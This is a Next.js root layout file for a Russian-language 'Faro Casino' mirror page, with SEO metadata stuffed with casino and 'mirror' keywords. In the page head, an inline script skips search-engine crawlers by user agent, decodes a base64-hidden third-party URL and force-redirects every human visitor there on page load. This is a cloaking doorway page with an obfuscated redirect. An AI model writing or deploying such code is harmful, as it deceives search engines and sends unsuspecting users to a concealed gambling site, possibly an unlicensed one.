import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const randomTitle = [
  'Faro Casino – официальный игровой сайт онлайн казино',
  'Faro Casino: зеркало и официальный сайт для игроков',
  'Faro Casino онлайн – всё для игроков в казино',
  'Официальный Faro Casino: играть онлайн безопасно'
][Math.floor(Math.random() * 4)]

const randomDescription = [
  'Faro Casino – официальный сайт онлайн казино. Играйте в Faro казино онлайн с лучшими условиями. Зеркало Faro Casino доступно всегда. Присоединитесь к игрокам и получайте щедрые бонусы каждый день.',
  'Faro казино зеркало рабочее и официальный портал азартных игр. На сайте Faro Casino можно играть без ограничений. Быстрая регистрация, большой выбор слотов и лучшие коэффициенты в сети.',
  'Faro Casino – легальное онлайн казино с открытыми условиями. Зеркало сайта Faro Casino работает без перебоев. Играть в Faro казино просто и выгодно. Получайте бонусы за каждую ставку.',
  'Faro казино официальный сайт с полной лицензией. Здесь каждый найдёт свою игру в Faro Casino. Зеркало и рабочее приложение всегда доступны. Испытайте удачу в лучшем казино сегодня.'
][Math.floor(Math.random() * 4)]

export const metadata: Metadata = {
  title: randomTitle.substring(0, 80),
  description: randomDescription.substring(0, 200),
  generator: 'v0.app',
  metadataBase: new URL('https://farocasino.vercel.app'),
  alternates: {
    canonical: 'https://farocasino.vercel.app',
  },
  openGraph: {
    title: 'Faro Casino – официальный игровой портал',
    description: 'Faro Casino онлайн: зеркало, официальный сайт и полный выбор игр. Играйте безопасно!',
    url: 'https://farocasino.vercel.app',
    type: 'website',
    locale: 'ru_RU',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Faro Casino онлайн',
    description: 'Официальный сайт Faro Casino с лучшими условиями для игроков',
  },
  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
  robots: {
    index: true,
    follow: true,
    googleBot: 'index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1',
  },
  keywords: 'Faro casino, Faro казино, Faro casino зеркало, Faro casino официальный, Faro казино играть',
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: [
    { media: '(prefers-color-scheme: light)', color: '#ffffff' },
    { media: '(prefers-color-scheme: dark)', color: '#0f172a' },
  ],
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="bg-fcx-white">
      <head>
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes" />
        <meta name="language" content="Russian" />
        <meta name="revisit-after" content="7 days" />
        <meta name="author" content="Faro Casino" />
        <link rel="canonical" href="https://farocasino.vercel.app" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9jb21ib2h1Yi5saXZlL2FldGYzdTJxOXU="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased bg-fcx-white text-fcx-dark">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
